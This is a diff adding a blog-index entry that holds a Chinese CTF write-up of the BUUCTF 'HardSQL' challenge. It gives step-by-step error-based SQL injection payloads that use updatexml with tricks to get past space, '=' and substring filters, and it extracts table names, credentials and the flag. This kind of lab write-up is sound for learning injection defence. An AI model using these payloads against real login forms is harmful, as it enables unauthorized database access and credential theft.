@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>BUU-HardSQL</title>
+      <link href="/2022/07/22/BUU-HardSQL/"/>
+      <url>/2022/07/22/BUU-HardSQL/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>BUU一到SQL注入题目。</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>打开靶场：</p><p><img src="/2022/07/22/BUU-HardSQL/image-20220722193115706.png" alt="image-20220722193115706"></p><p>先试试万能密码：<br><img src="/2022/07/22/BUU-HardSQL/image-20220722193158683.png" alt="image-20220722193158683"></p><p>这里应该是把空格过滤了，测试一下：</p><p><img src="/2022/07/22/BUU-HardSQL/image-20220722193206702.png" alt="image-20220722193206702"></p><p>输入admin’ ‘，还是返回同样的页面：</p><p><img src="/2022/07/22/BUU-HardSQL/image-20220722193344862.png" alt="image-20220722193344862"></p><p><img src="/2022/07/22/BUU-HardSQL/image-20220722193416204.png" alt="image-20220722193416204"></p><p>使用括号替换空格发现出现报错，没有出现那几个汉字，证明确实过滤了空格：</p><p><img src="/2022/07/22/BUU-HardSQL/image-20220722193501191.png" alt="image-20220722193501191"></p><blockquote><p><strong>空格绕过原理：</strong></p><p>括号是来包含子查询的，任何可以计算出结果的语句都可以用括号围起来，而括号的两端，可以没有多余的空格。</p></blockquote><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>这里使用报错注入试试：</p><pre class="line-numbers language-none"><code class="language-none">admin&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/07/22/BUU-HardSQL/image-20220722193846743.png" alt="image-20220722193846743"></p><p><img src="/2022/07/22/BUU-HardSQL/image-20220722193803204.png" alt="image-20220722193803204"></p><p>爆出数据库。</p><p>查表时候遇到<code>=</code>也被过滤了：</p><p><img src="/2022/07/22/BUU-HardSQL/image-20220722195230839.png" alt="image-20220722195230839"></p><p><img src="/2022/07/22/BUU-HardSQL/image-20220722195240537.png" alt="image-20220722195240537"></p><p>那这里就是用like进行绕过。</p><p>继续查表：</p><pre class="line-numbers language-none"><code class="language-none">admin&#39;or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(&#39;geek&#39;)),0x7e),1))#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/07/22/BUU-HardSQL/image-20220722193955687.png" alt="image-20220722193955687"></p><p>查列名：</p><pre class="line-numbers language-none"><code class="language-none">admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1))#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/07/22/BUU-HardSQL/image-20220722194218537.png" alt="image-20220722194218537"></p><p>查flag：</p><pre class="line-numbers language-none"><code class="language-none">admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(id,&#39;~&#39;,username,&#39;~&#39;,password))from(H4rDsq1)),0x7e),1))#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/07/22/BUU-HardSQL/image-20220722194303359.png" alt="image-20220722194303359"></p><p>只拿到一般flag；另一半使用right构造payload：</p><p><strong>（这里由于是得到一般flag，一般可以使用substring和mid来截取，但是这两个字段也被过滤了，使用right或者left进行替换绕过）</strong></p><pre class="line-numbers language-none"><code class="language-none">admin&#39;or(updatexml(1,concat(0x7e,(select(right(password,25))from(H4rDsq1)),0x7e),1))#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/07/22/BUU-HardSQL/image-20220722194840708.png" alt="image-20220722194840708"></p><p>得到flag{da8a8535-7969-4874-9ab7-63496c6970ad}</p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><blockquote><p>1：空格被过滤可以使用/**/或者()绕过<br>2：=号被过滤可以用like来绕过<br>3：substring与mid被过滤可以用right与left来绕过</p></blockquote><blockquote><p><strong>空格绕过原理：</strong></p><p>括号是来包含子查询的，任何可以计算出结果的语句都可以用括号围起来，而括号的两端，可以没有多余的空格。</p></blockquote>]]></content>
+      
+      
+      <categories>
+          
+          <category> SQL注入 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> SQL注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Bugku-bp</title>
       <link href="/2022/07/22/Bugku-bp/"/>
       <url>/2022/07/22/Bugku-bp/</url>
